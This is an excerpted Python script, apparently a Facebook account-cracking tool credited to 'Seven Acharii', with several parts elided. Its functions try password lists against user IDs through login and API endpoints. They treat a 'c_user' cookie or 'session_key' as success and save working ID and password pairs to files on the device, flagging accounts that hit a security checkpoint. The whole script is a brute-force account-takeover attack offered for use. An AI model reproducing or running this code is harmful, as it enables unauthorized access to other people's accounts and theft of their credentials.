...
os.system('clear')
logo = ("""
\033[1;91m8888888b.  8888888b.   .d88888b.  
\033[1;91m888   Y88b 888   Y88b d88P" "Y88b 
\033[1;91m888    888 888    888 888     888 
\033[1;91m888   d88P 888   d88P 888     888 
\033[1;91m8888888P"  8888888P"  888     888 
\033[1;91m888        888 T88b   888     888 
\033[1;91m888        888  T88b  Y88b. .d88P 
\033[1;91m888        888   T88b  "Y88888P"\033[1;91m
==================================================
 Author : Seven Acharii
 Github : Not-Found
 Facebook : Seven Acharii
 Version : 0.1
==================================================""")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [PRO-ALIVE] %s | %s'%(ids,pas))
                                open(f'/sdcard/PRO-ALIVE.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [PRO-DEAD] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PRO-DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [PRO-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/PRO-ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[PRO-ALIVE] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[PRO-DEAD] '+idf+' | '+ps+'\033[0;97m')
